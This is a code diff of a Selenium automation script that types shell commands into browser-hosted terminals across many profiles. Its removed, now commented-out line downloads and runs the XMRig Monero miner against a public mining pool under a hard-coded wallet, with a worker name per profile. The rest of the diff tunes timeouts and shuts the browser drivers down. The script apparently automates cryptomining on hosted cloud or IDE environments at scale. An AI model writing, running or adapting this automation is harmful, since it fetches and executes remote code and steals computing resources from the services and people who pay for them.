@@ -212,11 +212,11 @@ const runCMDWithSelenium = async (driver, name) => {
     }
     await driver.actions().sendKeys('\uE007').perform(); // Enter key
     console.log('Commands executed with Selenium');
-    const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
-    await driver.actions().sendKeys(cmd).perform();
+    // const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    // await driver.actions().sendKeys(cmd).perform();
     await driver.actions().sendKeys('\uE007').perform(); // Enter key
     // 
-    await new Promise(resolve => setTimeout(resolve, 10 * 1000));
+    await new Promise(resolve => setTimeout(resolve, 1 * 1000));
     console.log('Commands executed with Selenium');
     // await driver.switchTo().defaultContent();
   } catch (error) {
@@ -244,17 +244,17 @@ const restartProfile = async ({ driver, listNewLink: links, port, name }) => {
 
 
     // Wait for iframe to load
-    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 8 * 60 * 1000);
+    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 4 * 60 * 1000);
     // Run commands
     const worker = workerName.includes(name) ? workerName : `${name}-${workerName}`;
-    await runCMDWithSelenium(driver, worker);
+    await runCMDWithSelenium(driver, worker.slice(0, 23));
 
     // Set a timer to close this after some time (not directly applicable in Selenium)
     // We'll just proceed to the next link
     console.log(`${workerName} done with Selenium`);
 
     // Wait a bit before moving to the next link
-    await wait(5, 10);
+    await wait(5, 5);
   }
 
 
@@ -271,7 +271,8 @@ const runProfile = async (port, name) => {
 
     if (!listNewLink || listNewLink.length === 0) return;
     await restartProfile({ driver, listNewLink, port, name });
-
+    await driver.close();
+    await driver.quit();
     return listLink;
   } catch (error) {
     console.error('Error in runProfile:', error);
@@ -311,7 +312,7 @@ const runAllProfile = async (machine, profilePath) => {
   }
   catch (error) {
     console.error('Error in main:', error);
-    await killChromeProcess().catch(console.error);
+    // await killChromeProcess().catch(console.error);
   }
 }
 
